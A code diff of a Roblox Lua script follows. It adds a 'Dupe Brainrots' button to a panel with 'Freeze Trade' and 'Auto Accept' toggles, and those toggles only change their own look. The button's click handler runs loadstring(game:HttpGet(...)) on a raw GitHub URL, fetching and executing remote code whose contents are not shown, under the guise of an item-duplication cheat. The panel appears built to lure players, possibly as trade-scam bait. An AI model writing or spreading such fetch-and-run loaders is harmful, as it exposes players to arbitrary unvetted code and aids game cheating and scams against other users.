@@ -1,6 +1,5 @@
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-
 local player = Players.LocalPlayer
 
 local gui = Instance.new("ScreenGui")
@@ -9,7 +8,7 @@ gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
 local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 280, 0, 170)
+main.Size = UDim2.new(0, 280, 0, 220) -- Increased height to fit new button
 main.Position = UDim2.new(0.7, 0, 0.4, 0)
 main.BackgroundColor3 = Color3.fromRGB(8, 18, 45)
 main.BorderSizePixel = 0
@@ -26,8 +25,8 @@ stroke.Parent = main
 
 local gradient = Instance.new("UIGradient")
 gradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 25, 70)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 30))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 25, 70)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 30))
 }
 gradient.Rotation = 90
 gradient.Parent = main
@@ -42,83 +41,143 @@ title.TextColor3 = Color3.fromRGB(255,255,255)
 title.Parent = main
 
 local function createToggle(text, yPos)
-	local label = Instance.new("TextLabel")
-	label.Size = UDim2.new(0.6, 0, 0, 30)
-	label.Position = UDim2.new(0, 15, 0, yPos)
-	label.BackgroundTransparency = 1
-	label.Text = text
-	label.Font = Enum.Font.Gotham
-	label.TextSize = 15
-	label.TextColor3 = Color3.fromRGB(200, 220, 255)
-	label.TextXAlignment = Enum.TextXAlignment.Left
-	label.Parent = main
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0.6, 0, 0, 30)
+    label.Position = UDim2.new(0, 15, 0, yPos)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.Font = Enum.Font.Gotham
+    label.TextSize = 15
+    label.TextColor3 = Color3.fromRGB(200, 220, 255)
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = main
 
-	local toggle = Instance.new("Frame")
-	toggle.Size = UDim2.new(0, 55, 0, 24)
-	toggle.Position = UDim2.new(1, -70, 0, yPos + 3)
-	toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
-	toggle.BorderSizePixel = 0
-	toggle.Parent = main
+    local toggle = Instance.new("Frame")
+    toggle.Size = UDim2.new(0, 55, 0, 24)
+    toggle.Position = UDim2.new(1, -70, 0, yPos + 3)
+    toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+    toggle.BorderSizePixel = 0
+    toggle.Parent = main
 
-	local tCorner = Instance.new("UICorner")
-	tCorner.CornerRadius = UDim.new(1, 0)
-	tCorner.Parent = toggle
+    local tCorner = Instance.new("UICorner")
+    tCorner.CornerRadius = UDim.new(1, 0)
+    tCorner.Parent = toggle
 
-	local knob = Instance.new("Frame")
-	knob.Size = UDim2.new(0, 20, 0, 20)
-	knob.Position = UDim2.new(0, 2, 0.5, -10)
-	knob.BackgroundColor3 = Color3.fromRGB(255,255,255)
-	knob.BorderSizePixel = 0
-	knob.Parent = toggle
+    local knob = Instance.new("Frame")
+    knob.Size = UDim2.new(0, 20, 0, 20)
+    knob.Position = UDim2.new(0, 2, 0.5, -10)
+    knob.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    knob.BorderSizePixel = 0
+    knob.Parent = toggle
 
-	local kCorner = Instance.new("UICorner")
-	kCorner.CornerRadius = UDim.new(1, 0)
-	kCorner.Parent = knob
+    local kCorner = Instance.new("UICorner")
+    kCorner.CornerRadius = UDim.new(1, 0)
+    kCorner.Parent = knob
 
-	local state = false
+    local state = false
 
-	toggle.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			state = not state
-			if state then
-				toggle.BackgroundColor3 = Color3.fromRGB(0, 130, 255)
-				knob:TweenPosition(UDim2.new(1, -22, 0.5, -10), "Out", "Quad", 0.2, true)
-			else
-				toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
-				knob:TweenPosition(UDim2.new(0, 2, 0.5, -10), "Out", "Quad", 0.2, true)
-			end
-		end
-	end)
+    toggle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            state = not state
+            if state then
+                toggle.BackgroundColor3 = Color3.fromRGB(0, 130, 255)
+                knob:TweenPosition(UDim2.new(1, -22, 0.5, -10), "Out", "Quad", 0.2, true)
+            else
+                toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+                knob:TweenPosition(UDim2.new(0, 2, 0.5, -10), "Out", "Quad", 0.2, true)
+            end
+        end
+    end)
 end
 
 createToggle("Freeze Trade", 55)
 createToggle("Auto Accept", 95)
 
+-- Dupe Brainrots Button
+local dupeButton = Instance.new("TextButton")
+dupeButton.Size = UDim2.new(0.9, 0, 0, 35)
+dupeButton.Position = UDim2.new(0.05, 0, 0, 140)
+dupeButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+dupeButton.BorderSizePixel = 0
+dupeButton.Text = "Dupe Brainrots"
+dupeButton.Font = Enum.Font.GothamBold
+dupeButton.TextSize = 16
+dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupeButton.Parent = main
+
+local dupeCorner = Instance.new("UICorner")
+dupeCorner.CornerRadius = UDim.new(0, 8)
+dupeCorner.Parent = dupeButton
+
+local dupeStroke = Instance.new("UIStroke")
+dupeStroke.Color = Color3.fromRGB(0, 200, 255)
+dupeStroke.Thickness = 1
+dupeStroke.Parent = dupeButton
+
+-- Button hover effects
+dupeButton.MouseEnter:Connect(function()
+    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    dupeStroke.Color = Color3.fromRGB(100, 220, 255)
+end)
+
+dupeButton.MouseLeave:Connect(function()
+    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+    dupeStroke.Color = Color3.fromRGB(0, 200, 255)
+end)
+
+-- Execute script on click
+dupeButton.MouseButton1Click:Connect(function()
+    -- Visual feedback
+    dupeButton.Text = "Loading..."
+    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+    
+    -- Execute the loadstring
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/GrowaGarden/refs/heads/main/Oii"))()
+    end)
+    
+    if success then
+        dupeButton.Text = "Executed!"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+        wait(1.5)
+        dupeButton.Text = "Dupe Brainrots"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+    else
+        dupeButton.Text = "Error!"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        warn("Dupe Brainrots Error: " .. tostring(err))
+        wait(1.5)
+        dupeButton.Text = "Dupe Brainrots"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+    end
+end)
+
+-- Dragging functionality
 local dragging = false
 local dragStart
 local startPos
 
 main.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true
-		dragStart = input.Position
-		startPos = main.Position
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-		local delta = input.Position - dragStart
-		main.Position = UDim2.new(
-			startPos.X.Scale,
-			startPos.X.Offset + delta.X,
-			startPos.Y.Scale,
-			startPos.Y.Offset + delta.Y
-		)
-	end
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        main.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
 end)
